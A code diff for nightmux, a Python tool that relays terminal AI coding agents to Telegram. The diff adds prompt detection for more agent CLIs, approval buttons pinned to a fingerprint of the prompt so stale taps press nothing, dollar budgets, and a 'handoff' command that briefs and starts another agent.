@@ -20,8 +20,10 @@ import contextlib
 import difflib
 import hmac
 import glob
+import gzip
 import hashlib
 import html
+import ipaddress
 import json
 import os
 import queue
@@ -42,7 +44,7 @@ import urllib.request
 import webbrowser
 import zlib
 
-VERSION = "1.3.0"
+VERSION = "1.5.0"
 CFG_PATH = os.path.expanduser(os.environ.get("NIGHTMUX_CONFIG", "~/.nightmux.json"))
 API = "https://api.telegram.org/bot{}/{}"
 LIMIT = 3500  # telegram hard cap is 4096; leave room for <pre> wrapper
@@ -717,7 +719,21 @@ WAITING = re.compile(r"^\s*[│┃]?\s*(?:"
                      r")"
                      # Footer hints, unambiguous wherever they land on the line.
                      r"|[\(\[][yY]/[nN](?:/[aA])?[\)\]]|Navigate ·|enter Confirm"
-                     r"|Enter to select ·|⇆ select", re.M)   # Claude Code's select menu
+                     r"|Enter to select ·|⇆ select"   # Claude Code's select menu
+                     # Gemini CLI marks the chosen row of a boxed dialog with ●: its
+                     # folder trust dialog has no other sign, and read as unknown.
+                     # Boxed only, since ● is also Claude Code's reply bullet.
+                     r"|^\s*[│┃]\s*●\s*\d[.)]\s"
+                     # Aider asks on its input line, and only the last line is asking:
+                     # an answered one stays in the scrollback.
+                     r"|\(Y\)es/\(N\)o\b[^\n]*\]:[ \t]*(?:\n[ \t]*)*\Z", re.M)
+# Aider's question takes its answer as a line, so the key waits for an Enter.
+LINE_ASK = re.compile(r"\(Y\)es/\(N\)o\b.*\]:\s*$")
+# The agent's own input box: a rule, then its prompt. A dialog takes the box's
+# place while it is up, so a "menu" with the box drawn under it is the
+# transcript quoting one. A reply ending in "2. Run the release command" read
+# as an open menu, and auto-yes typed 2 into the prompt every few seconds.
+INPUT_BOX = re.compile(r"^\s*─{8,}.*\n\s*[│┃]?\s*[❯>](?:\s|$)", re.M)
 # Mid-turn: these footers only render while the agent is working.
 # Claude Code picks a fresh gerund per turn — Puzzling…, Crafting…, Cogitating…,
 # Perusing… — so matching the word list caught almost nothing and read a working
@@ -733,7 +749,7 @@ BUSY = re.compile(r"esc (?:to )?(?:interrupt|cancel)"
                   r"|^\s*[^\w\s]{1,2}\s+\w+…\s*\(\d+[hms]"
                   r"|Brewing|Thinking…|Running…|Running\.\.\.", re.M)
 # A pick in whatever numbered menu the pane is showing, boxed or bare.
-MENU = re.compile(r"^\s*[│┃]?\s*(?:(?:[❯>]\s*)?(?:\[?\(?(\d+)[.)\]]\s+)|[❯>]\s+)(\S.*?)\s*[│┃]?$")
+MENU = re.compile(r"^\s*[│┃]?\s*(?:(?:[❯>●]\s*)?(?:\[?\(?(\d+)[.)\]]\s+)|[❯>]\s+)(\S.*?)\s*[│┃]?$")
 # opencode's modal draws key hints where the other TUIs write a question, so
 # WAITING saw nothing and the pane read "idle": no 🟠, no buttons, and drain()
 # free to type a queued prompt into an open dialog. The hints are chrome and
@@ -756,7 +772,7 @@ DIGIT_SGR = re.compile(r"(\x1b\[[0-9;]*m)(?=\d[.)])")
 # the border and the agent's own prose outside it, and prose numbers a plan:
 # "1. Core mechanic (wk 1)" is a MENU match and is not a choice anyone is being
 # offered. Where both are on screen, the box is the menu.
-BOXED = re.compile(r"^\s*[│┃]\s*[❯>]?\s*\d[.)]\s+\S")
+BOXED = re.compile(r"^\s*[│┃]\s*[❯>●]?\s*\d[.)]\s+\S")
 
 # A highlighted option that is not numbered and not boxed. Claude Code's trust
 # prompt used to be a boxed numbered list and is now a bare pointed one:
@@ -971,7 +987,7 @@ def model_cost(model):
     return next((r for k, r in MODEL_COST.items() if k in (model or "").lower()), 1.0)
 
 
-def tail_transcript(st, path, ladder=False):
+def tail_transcript(st, path, ladder=False, prices=None):
     """Assistant output appended since the last read. Exact text, no chrome.
 
     ladder: !ladder picks this session's model, so a turn on a lighter model
@@ -986,7 +1002,7 @@ def tail_transcript(st, path, ladder=False):
         return []
     if pos == size:
         return []
-    out, spent = [], 0.0
+    out, spent, usd = [], 0.0, 0.0
     with open(path, "rb") as f:
         f.seek(pos)
         while True:
@@ -1009,6 +1025,11 @@ def tail_transcript(st, path, ladder=False):
                         + u.get("cache_read_input_tokens", 0) * WEIGHT["read"]
                         + u.get("output_tokens", 0) * WEIGHT["out"])
                 spent += turn
+                if u:   # and at its model's list price, for a !budget in dollars
+                    p = price_of(rec["message"].get("model") or "", prices) or DEAREST
+                    usd += (u.get("input_tokens", 0) * p[0] + u.get("output_tokens", 0) * p[1]
+                            + u.get("cache_read_input_tokens", 0) * p[2]
+                            + u.get("cache_creation_input_tokens", 0) * p[3]) / 1e6
                 cheap = 1 - model_cost(rec["message"].get("model")) if u else 0
                 if ladder and turn and cheap > 0:
                     sav_add("model_tokens", round(turn * cheap))
@@ -1037,6 +1058,7 @@ def tail_transcript(st, path, ladder=False):
     if spent:
         st.setdefault("spend", []).append((time.time(), spent))
         st["unbilled"] = st.get("unbilled", 0) + spent     # for !budget's ledger
+        st["unbilled_usd"] = st.get("unbilled_usd", 0) + usd
     return out
 
 
@@ -1048,7 +1070,9 @@ def pane_state(lines):
     """
     tail = lines[-25:]
     joined = "\n".join(tail)
-    if WAITING.search(joined) or (ARROWED.search(joined)
+    asks = [m.start() for m in WAITING.finditer(joined)]
+    box = [m.start() for m in INPUT_BOX.finditer(joined)]
+    if (asks and (not box or box[-1] < asks[-1])) or (ARROWED.search(joined)
                                   and any(BOXED.match(l) or CHOICE.match(l)
                                           for l in tail)):
         return "waiting"
@@ -1135,13 +1159,39 @@ def bar_opts(lines):
     return None
 
 
-def menu_buttons(lines, sess=None):
+_FP_DIGITS = re.compile(r"\d+")
+# Borders, blocks, spinner frames, row markers, arrows, emoji: drawn, never typed.
+_FP_DRAW = re.compile(r"[\u2190-\u21ff\u2500-\u27bf\u2800-\u28ff\u2b00-\u2bff\U0001f300-\U0001faff]")
+_FP_ROW = re.compile(r"^[›>]\s?")   # the picked row moves with ↑↓ (❯ goes with the glyphs)
+
+
+def prompt_fp(lines):
+    """Six hex digits naming the prompt on screen, for a button to be pinned to.
+
+    What a tap would approve is in the last screenful: the command or diff above
+    the menu, and the menu. Counters, borders, spinner frames, padding and the
+    picked row all move while the prompt sits still, so they are folded out; a
+    different command is not, and changes the fingerprint. (dialog_id will not
+    do: it starts at the question, and the command is above that.)
+    """
+    tail = strip_noise([l for l in lines if l.strip()][-15:], verbose=True)
+    rows = (_FP_ROW.sub("", " ".join(_FP_DRAW.sub(" ", _FP_DIGITS.sub("#", l)).split()))
+            for l in tail)
+    return hashlib.sha1("\n".join(r for r in rows if r).encode()).hexdigest()[:6]
+
+
+def menu_buttons(lines, sess=None, bind=False):
     """One tap-button per option of the menu the pane is waiting on.
 
     A session suffix on the callback data (`!1 api` instead of bare `!1`) lets
     a tap answer the right pane regardless of which topic it landed in — the
     command center mirrors this same message into a topic bound to nothing, so
     topic-binding alone cannot resolve it there.
+
+    `bind` pins the buttons that answer (the options and ⏎) to the prompt they
+    were drawn for, as `~<prompt_fp>` on the callback data: handle() presses
+    nothing once the pane shows a different one. Left off, a button on a
+    message from an hour ago answers whatever the agent asks next.
     """
     opts = {d: label[:28] + ("…" if len(label) > 28 else "")
             for d, label in menu_items(lines) if d.isdigit()}
@@ -1149,13 +1199,21 @@ def menu_buttons(lines, sess=None):
     for i, label in enumerate(bar[0] if bar else []):
         opts[str(i + 1)] = label[:28] + ("…" if len(label) > 28 else "")
     suffix = f" {sess}" if sess else ""
+    pin = f" ~{prompt_fp(lines)}" if bind else ""
+
+    def tap(name, answer=False):
+        data = f"!{name}{suffix}"
+        # Telegram caps callback data at 64 bytes: a long session name keeps its
+        # button, unpinned, rather than costing the whole message.
+        return data + pin if answer and len((data + pin).encode()) <= 64 else data
+
     # A bare arrow menu (the trust prompts) gets its rows by position, and the
     # nav row drives anything else, exactly as you would in the terminal.
-    rows = [[(f"{d}. {opts[d]}", f"!{d}{suffix}")] for d in sorted(opts)]
-    rows.append([("esc", f"!esc{suffix}"), ("←", f"!left{suffix}"),
-                 ("→", f"!right{suffix}"), ("⏎", f"!enter{suffix}")] if bar else
-                [("esc", f"!esc{suffix}"), ("↑", f"!up{suffix}"),
-                 ("↓", f"!down{suffix}"), ("⏎", f"!enter{suffix}")])
+    rows = [[(f"{d}. {opts[d]}", tap(d, True))] for d in sorted(opts)]
+    rows.append([("esc", tap("esc")), ("←", tap("left")),
+                 ("→", tap("right")), ("⏎", tap("enter", True))] if bar else
+                [("esc", tap("esc")), ("↑", tap("up")),
+                 ("↓", tap("down")), ("⏎", tap("enter", True))])
     return kb(rows)
 
 
@@ -1442,20 +1500,24 @@ def failover_buttons(cfg, topic, sess):
     return kb([[("⏭ hand to " + k, "!failover " + k) for k in alts]]) if alts else None
 
 
-def teleport_packet(cfg, state, topic, sess, was=None, last=None, force=False):
+def teleport_packet(cfg, state, topic, sess, was=None, last=None, force=False, cwd=None, tpath=None):
     """Build a structured cross-agent handoff packet (.nightmux/HANDOFF.md) so a
     receiving agent continues mid-thought without re-exploring the codebase.
+
+    cwd and tpath name the folder and the Claude transcript directly, for
+    `nightmux handoff`, which has no topic, session or daemon to ask.
     """
     st = (state.get(sess) or {}) if sess else {}
     was = was or (cfg.get("started") or {}).get(topic) or default_agent(cfg)
     last = last if last is not None else (st.get("last") or "")
-    cwd = (cfg.get("dirs") or {}).get(topic) or (sess_cwd(sess) if sess and has_session(sess) else None)
+    cwd = cwd or (cfg.get("dirs") or {}).get(topic) or (sess_cwd(sess) if sess and has_session(sess) else None)
     tools, notes = [], []
-    tpath = (st.get("snap") or {}).get("transcript")
+    tpath = tpath or (st.get("snap") or {}).get("transcript")
     if tpath and os.path.isfile(tpath):
         try:
-            with open(tpath, encoding="utf-8", errors="replace") as f:
-                tail = f.readlines()[-40:]
+            with open(tpath, "rb") as f:   # the tail only: a long session runs to hundreds of MB
+                f.seek(max(0, os.path.getsize(tpath) - 2_000_000))
+                tail = f.read().decode("utf-8", "replace").splitlines()[-200:]
             for raw in tail:
                 try:
                     rec = json.loads(raw)
@@ -1467,15 +1529,21 @@ def teleport_packet(cfg, state, topic, sess, was=None, last=None, force=False):
                         continue
                     if b.get("type") == "tool_use":
                         tools.append(f"- `{b.get('name', 'tool')}`: {brief(b.get('input') or {})}")
-                    elif b.get("type") == "text" and (b.get("text") or "").strip():
+                    elif rec.get("type") == "assistant" and b.get("type") == "text" and (b.get("text") or "").strip():
                         txt = " ".join((b.get("text") or "").strip().split())
                         if len(txt) > 20:
                             notes.append("- " + txt[:240])
         except OSError:
             pass
     scr = strip_noise(pane(sess))[-12:] if sess and has_session(sess) else []
-    gstat = tmux_git(cwd, "status", "-sb") if cwd and os.path.isdir(cwd) else ""
-    gdiff = tmux_git(cwd, "diff", "--stat", "HEAD") if cwd and os.path.isdir(cwd) else ""
+
+    def git(*a):
+        # run() hands back git's complaint as its output; a brief is no place for it.
+        # And a repo with 20k untracked files must not become a 20k-line prompt.
+        out = tmux_git(cwd, *a) if cwd and os.path.isdir(cwd) else ""
+        ls = out.splitlines()
+        return "" if out.startswith("fatal:") else (out if len(ls) <= 40 else "\n".join(ls[:38] + ["…"] + ls[-1:]))
+    gstat, gdiff, glog = git("status", "-sb"), git("diff", "--stat", "HEAD"), git("log", "--oneline", "-5")
     lines = [
         f"# 🧬 Nightmux Context Teleport ({was})",
         f"Generated: {time.strftime('%Y-%m-%d %H:%M:%S UTC', time.gmtime())}",
@@ -1493,6 +1561,8 @@ def teleport_packet(cfg, state, topic, sess, was=None, last=None, force=False):
         lines += ["", "## Git Status", "```", gstat, "```"]
     if gdiff:
         lines += ["", "## Git Diffstat", "```", gdiff, "```"]
+    if glog:
+        lines += ["", "## Recent Commits", "```", glog, "```"]
     if cwd and os.path.isfile(os.path.join(cwd, ".nightmux", "memory.md")):
         lines += ["", "## Project Memory", "See `.nightmux/memory.md` for architecture, test commands, and decisions."]
     body = "\n".join(lines) + "\n"
@@ -1560,6 +1630,137 @@ def teleport_cmd(cfg, state, lock, topic, sess, arg):
             + (f" with {len(rest)} queued prompt(s)" if rest else ""))
 
 
+# What starts each agent in a session that opens on a prompt. These CLIs disagree
+# (a bare `qwen "..."` is a one-shot, opencode wants a flag), so only the ones
+# checked against their own --help are started; any other gets the brief to paste.
+# A cfg["agents"] entry can change the binary, not these flags.
+HANDOFF_FLAGS = {"claude": [], "codex": [], "opencode": ["--prompt"],
+                 "agy": ["-i"], "gemini": ["-i"], "qwen": ["-i"]}
+HANDOFF_USAGE = """usage: nightmux handoff [agent [instruction...]]
+
+  (no agent)   write .nightmux/HANDOFF.md for this folder and show it
+  <agent>      ...and start that agent on it, here in this terminal: """ + ", ".join(HANDOFF_FLAGS) + """
+  <agent> <instruction...>   the same, with what to do next
+"""
+
+
+def _chat_cwd(path, codex):
+    """The folder a Claude Code or Codex transcript ran in, from its first lines."""
+    with open(path, encoding="utf-8", errors="replace") as f:
+        for _, line in zip(range(30), f):
+            if '"cwd"' in line:
+                try:
+                    d = json.loads(line)
+                except ValueError:
+                    continue
+                cwd = (d.get("payload") or {}).get("cwd") if codex else d.get("cwd")
+                if cwd:
+                    return cwd
+    return None
+
+
+def _chat_last(path, codex):
+    """The last thing the person typed in a transcript. Tool results, meta lines,
+    <command> echoes, slash commands and the summary a /compact writes back are
+    "user" records too; counted as prompts they would bury it."""
+    last = ""
+    with open(path, encoding="utf-8", errors="replace") as f:
+        for line in f:
+            if '"type":"user"' not in line and '"user_message"' not in line:
+                continue
+            try:
+                d = json.loads(line)
+            except ValueError:
+                continue
+            if codex:
+                pl = d.get("payload") or {}
+                if pl.get("type") == "user_message":
+                    last = pl.get("message") or last
+                continue
+            c = (d.get("message") or {}).get("content")
+            if (d.get("type") == "user" and isinstance(c, str) and c.strip() and not c.startswith("<")
+                    and not (d.get("isMeta") or d.get("isSidechain") or d.get("isCompactSummary"))
+                    and not re.match(r"/[\w:-]+(\s|$)", c)):
+                last = c
+    return last
+
+
+def latest_chat(root, home=None):
+    """(agent, transcript, last prompt) of the newest Claude Code or Codex conversation
+    that ran in `root` or under it; (None, None, "") when there is none."""
+    home = home or os.path.expanduser("~")
+    found = [(p, False) for p in glob.glob(os.path.join(home, ".claude", "projects", "*", "*.jsonl"))]
+    found += [(p, True) for p in glob.glob(os.path.join(home, ".codex", "sessions", "*", "*", "*", "*.jsonl"))]
+    stamped = []
+    for p, codex in found:
+        try:
+            stamped.append((os.path.getmtime(p), p, codex))
+        except OSError:       # gone since the glob
+            pass
+    root = root.rstrip(os.sep)
+    for _, path, codex in sorted(stamped, reverse=True)[:200]:
+        try:
+            cwd = _chat_cwd(path, codex)
+            if cwd and (cwd == root or cwd.startswith(root + os.sep)):
+                return ("codex" if codex else "claude"), path, _chat_last(path, codex)
+        except OSError:
+            pass
+    return None, None, ""
+
+
+def _exec(argv):
+    os.execvp(argv[0], argv)
+
+
+def handoff_cli(args):
+    """`nightmux handoff [agent [instruction...]]`: write what the last agent in this folder
+    left behind (its last instruction, recent actions, the git state) to
+    .nightmux/HANDOFF.md and, given an agent, start that agent on it. The plain-CLI
+    side of !teleport: no bot, daemon or config."""
+    try:
+        cfg = load_cfg()
+    except (OSError, ValueError):
+        cfg = {}
+    known = agents(cfg)
+    if args[:1] in (["-h"], ["--help"]):
+        print(HANDOFF_USAGE, end="")
+        return
+    if args and args[0] not in known:
+        print(f"nightmux handoff: unknown agent {args[0]!r}\n\n{HANDOFF_USAGE}", end="", file=sys.stderr)
+        sys.exit(2)
+    here = os.getcwd()
+    top = tmux_git(here, "rev-parse", "--show-toplevel")
+    in_repo = bool(top) and not top.startswith("fatal:") and os.path.isdir(top)
+    root = top if in_repo else here
+    was, tpath, last = latest_chat(root)
+    last = last.strip()[:2000]
+    hpath, body = teleport_packet({}, {}, None, None, was=was or "unknown agent", last=last, force=in_repo,
+                                  cwd=root, tpath=tpath if was == "claude" else None)
+    if not args:
+        installed = [k for k in HANDOFF_FLAGS if shutil.which(agent(cfg, k)[0])]
+        print(body + ("\nsaved to " + hpath if hpath else "\nnot a git repo, so nothing was written")
+              + "\nhand it on: nightmux handoff <agent> [instruction]    here: " + (", ".join(installed) or "none installed"))
+        return
+    key, extra = args[0], " ".join(args[1:]).strip()
+    prompt = (f"{was or 'Another agent'} was working in this directory and stopped before it was done. "
+              + (f"Read {hpath} first: it holds its last instruction, recent actions and the git state. " if hpath else "")
+              + "Look at the working tree to see how far it got, then carry on."
+              + (f"\n\nNext instruction:\n{extra}" if extra else "")
+              + ("" if hpath else "\n\n" + body[:6000]))
+    binary = agent(cfg, key)[0]
+    if key not in HANDOFF_FLAGS:
+        sys.exit(f"nightmux does not know how to start {key} on a prompt. Start it here and paste:\n\n{prompt}")
+    if not shutil.which(binary):
+        sys.exit(f"{binary} is not installed here (or not on PATH). Start it elsewhere and paste:\n\n{prompt}")
+    print(f"🧬 handoff · {was or 'unknown agent'} → {key}\n"
+          + (f"   last instruction: {last.splitlines()[0][:100]}\n" if last else "")
+          + (f"   brief: {hpath}\n" if hpath else "   not a git repo: the brief goes in the prompt\n"), flush=True)
+    try:
+        _exec([binary, *HANDOFF_FLAGS[key], prompt])
+    except OSError as e:
+        sys.exit(f"could not start {binary}: {e}")
+
+
 def failover(cfg, state, lock, topic, key):
     """!failover <agent>: hand a limit-held topic's work to another agent now,
     instead of waiting hours for the window to reset.
@@ -1610,7 +1811,7 @@ def failover_tick(cfg, state, lock):
     for topic, sess in list(cfg.get("topics", {}).items()):
         st = state.get(sess) or {}
         if (st.get("limit_until", 0) > time.time() and st.get("queue")
-                and not st.get("failed_over")):
+                and not st.get("failed_over") and not st.get("stop_hold")):
             st["failed_over"] = True     # once per hold, whatever the outcome
             sav_add("failovers")
             send(cfg, topic, "⏭ auto-failover\n" + failover(cfg, state, lock, topic, key),
@@ -1791,7 +1992,7 @@ def harvest_tick(cfg, state, lock):
         sess = (cfg.get("topics") or {}).get(str(topic))
         st = state.get(sess) or {}
         if (not sess or st.get("mode") != "idle" or st.get("queue") or st.get("shift")
-                or st.get("limit_until", 0) > now
+                or st.get("limit_until", 0) > now or st.get("stop_hold")
                 or now - st.get("changed", 0) < HARVEST_IDLE):
             continue
         with lock:
@@ -2116,47 +2317,58 @@ def budget_window(cfg, per, now=None):
     return start, start + 86400
 
 
-def spend_note(sess, n, now=None):
-    """Add to the per-session ledger: tokens per UTC hour, 35 days kept."""
+def spend_note(sess, n, now=None, ledger="spent"):
+    """Add to a per-session ledger, tokens ("spent") or dollars ("spent_usd") per
+    UTC hour, 35 days kept."""
     hr = int((now or time.time()) // 3600)
     with _sav_lock:
-        led = sav_data().setdefault("spent", {}).setdefault(sess, {})
+        led = sav_data().setdefault(ledger, {}).setdefault(sess, {})
         led[str(hr)] = led.get(str(hr), 0) + n
         for k in [k for k in led if int(k) < hr - 35 * 24]:
             del led[k]
         _sav["dirty"] = True
 
 
-def budget_used(cfg, topic, start):
+def budget_used(cfg, topic, start, ledger="spent"):
     sessions = set(bench_of(cfg, topic).values()) | {cfg["topics"].get(topic)}
     with _sav_lock:
-        led = sav_data().get("spent") or {}
-        return int(sum(n for s in sessions for h, n in (led.get(s) or {}).items()
-                       if int(h) >= start // 3600))
+        led = sav_data().get(ledger) or {}
+        used = sum(n for s in sessions for h, n in (led.get(s) or {}).items() if int(h) >= start // 3600)
+    return used if ledger == "spent_usd" else int(used)
+
+
+def budget_of(cfg, topic, b, start):
+    """(used, cap, how to write an amount) for a budget in tokens or in dollars."""
+    if "usd" in b:
+        return budget_used(cfg, topic, start, "spent_usd"), b["usd"], _usd
+    return budget_used(cfg, topic, start), b["tokens"], _k
 
 
 def budget_tick(cfg, state, topic, sess):
     st = state.setdefault(sess, {})
     spend_note(sess, st.pop("unbilled", 0))
+    if st.get("unbilled_usd"):
+        spend_note(sess, st.pop("unbilled_usd"), ledger="spent_usd")
     b = (cfg.get("budgets") or {}).get(str(topic))
     if not b:
         return
     start, end = budget_window(cfg, b["per"])
-    used, cap, key = budget_used(cfg, topic, start), b["tokens"], f"{b['per']}:{int(start)}"
+    used, cap, amt = budget_of(cfg, topic, b, start)
+    key = f"{b['per']}:{int(start)}:{cap}"      # a new amount warns and holds afresh
     if used >= cap and st.get("budget_hold") != key:
-        st["budget_hold"] = st["budget_warned"] = key
+        st["budget_warned"] = key
         for s in set(bench_of(cfg, topic).values()) | {sess}:
             o = state.setdefault(s, {})
-            o["limit_until"] = max(o.get("limit_until", 0), end)
+            o["limit_until"], o["budget_hold"] = max(o.get("limit_until", 0), end), key
         save_queue(state)
         event(cfg, "budget", topic, sess)
-        send(cfg, topic, f"💸 {sess} spent its {BUDGET_ADJ[b['per']]} budget: {_k(used)} of {_k(cap)} — "
+        send(cfg, topic, f"💸 {sess} spent its {BUDGET_ADJ[b['per']]} budget: {amt(used)} of {amt(cap)} — "
              f"the turn in flight finishes, new prompts queue until {clock(cfg, end)}.\n"
              "!budget off or a bigger !budget to lift it", mode="plain")
     elif used >= 0.8 * cap and st.get("budget_warned") != key:
         st["budget_warned"] = key
         send(cfg, topic, f"💸 {sess} at {used / cap:.0%} of its {BUDGET_ADJ[b['per']]} budget "
-             f"({_k(used)} of {_k(cap)})", mode="plain")
+             f"({amt(used)} of {amt(cap)})", mode="plain")
 
 
 def budget_line(cfg, topic):
@@ -2164,8 +2376,8 @@ def budget_line(cfg, topic):
     b = (cfg.get("budgets") or {}).get(str(topic))
     if not b:
         return None
-    used = budget_used(cfg, topic, budget_window(cfg, b["per"])[0])
-    return f"{_k(used)} of {_k(b['tokens'])} this {b['per']}"
+    used, cap, amt = budget_of(cfg, topic, b, budget_window(cfg, b["per"])[0])
+    return f"{amt(used)} of {amt(cap)} this {b['per']}"
 
 
 def budget_cmd(cfg, state, topic, sess, arg):
@@ -2173,30 +2385,38 @@ def budget_cmd(cfg, state, topic, sess, arg):
     words = arg.lower().split()
     if words[:1] == ["off"]:
         bs.pop(str(topic), None)
+    elif words:
+        usd = re.fullmatch(r"\$(\d+(?:\.\d+)?)", words[0])
+        n = float(usd.group(1)) if usd else parse_amount(words[0])[1]
+        per = words[1] if len(words) > 1 else "day"
+        if not n or per not in ("day", "week", "month"):
+            return ("usage: !budget <50M|800k|$20> [day|week|month] | off   "
+                    "(base-equiv tokens, or dollars at API list prices)")
+        bs[str(topic)] = {"usd": n, "per": per} if usd else {"tokens": n, "per": per}
+    lifted = 0
+    if words:
         save_cfg(cfg)
-        lifted = 0
+        # Off or a new amount lifts the hold of the old one, on every agent of
+        # the topic; a new amount that is spent too holds again below.
         for s in set(bench_of(cfg, topic).values()) | {sess}:
             o = state.get(s) or {}
             if o.pop("budget_hold", None):
                 o.pop("limit_until", None)
                 lifted += 1
         save_queue(state)
+    if words[:1] == ["off"]:
         return "budget off" + (" · hold lifted, the queue resumes on idle" if lifted else "")
-    if words:
-        _, n = parse_amount(words[0])
-        per = words[1] if len(words) > 1 else "day"
-        if not n or per not in ("day", "week", "month"):
-            return "usage: !budget <50M|800k> [day|week|month] | off   (base-equiv tokens)"
-        bs[str(topic)] = {"tokens": n, "per": per}
-        save_cfg(cfg)
     b = bs.get(str(topic))
     if not b:
-        return "no budget here · !budget 50M [day|week|month] holds new prompts once it is spent"
+        return "no budget here · !budget 50M or $20 [day|week|month] holds new prompts once it is spent"
+    if words:
+        budget_tick(cfg, state, topic, sess)
     start, end = budget_window(cfg, b["per"])
-    used = budget_used(cfg, topic, start)
-    return (f"💸 {_k(used)} of {_k(b['tokens'])} this {b['per']} ({used / b['tokens']:.0%}) · "
-            f"resets {time.strftime('%a %H:%M', local_time(cfg, end))}\nbase-equivalent tokens: "
-            "cache reads count 0.1, output 5 — the same scale as !cost")
+    used, cap, amt = budget_of(cfg, topic, b, start)
+    return (f"💸 {amt(used)} of {amt(cap)} this {b['per']} ({used / cap:.0%}) · "
+            f"resets {time.strftime('%a %H:%M', local_time(cfg, end))}\n" +
+            ("dollars at API list prices, from Claude Code's usage records" if "usd" in b else
+             "base-equivalent tokens: cache reads count 0.1, output 5 — the same scale as !cost"))
 
 
 # ---------- events: a webhook for lights, Home Assistant, anything ----------
@@ -2302,7 +2522,8 @@ def digest_report(cfg, state, topic, sess, since):
     t = token_tally([path] if path else [])
     spend = (f"~{int(sum(t[k] * w for k, w in WEIGHT.items())):,} tok, {t['turns']} turns"
              if t["turns"] else "no usage yet")
-    mode = "held" if st.get("limit_until", 0) > time.time() else st.get("mode", "?")
+    mode = ("stopped" if st.get("stop_hold") else
+            "held" if st.get("limit_until", 0) > time.time() else st.get("mode", "?"))
     ctx = f" · ctx {snap['ctx_pct']:.0f}%" if snap.get("ctx_pct") is not None else ""
     ask = (f"\n🟠 waiting: {st['asked'].splitlines()[0][:60]}"
            if mode == "waiting" and st.get("asked") else "")
@@ -2451,7 +2672,7 @@ def autocompact(cfg, state, topic, sess):
         for k in ("compacted", "compact_at", "compact_tries", "compact_gave_up"):
             st.pop(k, None)
         return
-    if st.get("mode") not in ("idle", "unknown") or st.get("queue"):
+    if st.get("mode") not in ("idle", "unknown") or st.get("queue") or st.get("stop_hold"):
         return
     if st.get("compacted"):
         # The keystrokes can be eaten -- a menu open, a turn starting on the same
@@ -2535,7 +2756,7 @@ def queue_blob(state):
     out = {}
     for sess, st in list(state.items()):   # the command thread adds sessions
         held = {k: st[k] for k in ("queue", "limit_until", "sched", "shift",
-                                   "shift_total", "budget_hold") if st.get(k)}
+                                   "shift_total", "budget_hold", "stop_hold") if st.get(k)}
         if held.get("limit_until", 0) < time.time():
             held.pop("limit_until", None)   # an expired hold is history, not state
         if held:
@@ -2574,7 +2795,7 @@ def load_queue(state):
         state.setdefault(sess, {}).update(held)
     _queued[0] = blob
     return {s: h for s, h in blob.items()
-            if h.get("queue") or h.get("sched") or h.get("shift")}
+            if h.get("queue") or h.get("sched") or h.get("shift") or h.get("stop_hold")}
 
 
 def drain(cfg, state, topic, sess):
@@ -2622,17 +2843,21 @@ def drain(cfg, state, topic, sess):
             st["resumed"] = True
         else:
             st["resumed"] = True     # the send below says "resumed", not "sending"
-    open_window = st.get("mode") == "idle" and time.time() >= st.get("limit_until", 0)
+    open_window = (st.get("mode") == "idle" and time.time() >= st.get("limit_until", 0)
+                   and not st.get("stop_hold"))
     q = st.get("queue")
     if q and open_window:
         held = st.pop("resumed", None)
-        if held:
-            sav_add("resumes")
+        # The first resume on this machine is when nightmux has earned a star
+        # ask, so it asks there, once, rather than in the installer.
+        star = (f"\n\n⭐ First resume past a usage limit on this machine. If nightmux "
+                f"saved your night, a star helps others find it: {REPO_URL}"
+                if held and sav_add("resumes") == 1 else "")
         text = q.pop(0)
         if held:
             event(cfg, "resumed", topic, sess)
         send(cfg, topic, f"▶️ {sess} {'resumed · sending' if held else 'sending'} queued "
-             f"prompt{f' ({len(q)} left)' if q else ''}\n{text[:500]}", mode="plain")
+             f"prompt{f' ({len(q)} left)' if q else ''}\n{text[:500]}{star}", mode="plain")
         # Every prompt that reaches here was sent by the daemon, not typed live
         # this instant — a lockout replay, a schedule firing, a busy-queued
         # human prompt going in unattended a moment later. That is the line: a
@@ -2810,7 +3035,7 @@ def flush_new(cfg, state, topic, sess, pane_id=None):
     # first, because a transcript that grew is reason enough to do the rest.
     st["snap"] = snap = snapshot(pane_id)
     tpath = (snap or {}).get("transcript")
-    gained = tail_transcript(st, tpath, ladder_on(cfg, topic)) if tpath else []
+    gained = tail_transcript(st, tpath, ladder_on(cfg, topic), cfg.get("prices")) if tpath else []
     if st.get("unbilled"):
         budget_tick(cfg, state, topic, sess)
     if gained:
@@ -2990,12 +3215,13 @@ def resolve_ask(cfg, st):
     st.pop("asked", None)
 
 
-def ask(cfg, st, topic, sess, body, lines, key=None):
+def ask(cfg, st, topic, sess, body, lines, key=None, force=False):
     """Announce a prompt once. The pane redraws constantly; the question doesn't.
 
     Deduped on `key` — the question itself — not on the whole message, because
     the text above it arrives as a diff that keeps shifting while the menu sits
     still. Without this the same menu is resent every few seconds, forever.
+    `force` announces it again anyway: a tap found its prompt gone (stale_tap).
 
     Mirrored into the command-center topic too, when one is set: buttons carry
     the session name (menu_buttons(lines, sess)) so a tap resolves the same
@@ -3003,10 +3229,10 @@ def ask(cfg, st, topic, sess, body, lines, key=None):
     left unanswered can have its buttons pulled.
     """
     key = key or body
-    if not body or key == st.get("asked") or notified(sess):
+    if not body or (not force and (key == st.get("asked") or notified(sess))):
         return False
     st["asked"], st["asked_at"] = key, time.time()
-    buttons = menu_buttons(lines, sess)
+    buttons = menu_buttons(lines, sess, bind=True)
     msgs = []
     mid = send(cfg, topic, f"🟠 needs input {sess}\n{body}", buttons=buttons)
     event(cfg, "needs_input", topic, sess, body)
@@ -3019,6 +3245,26 @@ def ask(cfg, st, topic, sess, body, lines, key=None):
             msgs.append((center, mid2))
     st["asked_msgs"] = msgs
     return True
+
+
+def stale_tap(cfg, state, lock, sess, lines):
+    """A pinned button whose prompt has moved on: press nothing, say what is up.
+
+    The old buttons would otherwise answer the new prompt — same question,
+    different command. If the pane is asking something now, post that, with
+    buttons that fit it.
+    """
+    if pane_state(lines) != "waiting":
+        return f"that prompt is already gone — nothing pressed in {sess}"
+    topic = next((t for t, s in cfg["topics"].items() if s == sess), None)
+    if topic:
+        tail = [l for l in lines if l.strip()][-15:]
+        with lock:
+            st = state.setdefault(sess, {})
+            resolve_ask(cfg, st)
+            ask(cfg, st, topic, sess, "\n".join(strip_noise(tail, verbose=True)).strip(),
+                lines, prompt_key(lines), force=True)
+    return f"that button was for an earlier prompt — nothing pressed in {sess}"
 
 
 def nudge(cfg, state, topic, sess):
@@ -3042,7 +3288,7 @@ def nudge(cfg, state, topic, sess):
     print(f"nudge {sess}: waiting {int((now - since) / 60)}m on {cause[:120]!r}",
           file=sys.stderr, flush=True)
     text = f"⏰ {sess} has been waiting {int((now - since) / 60)}m for an answer"
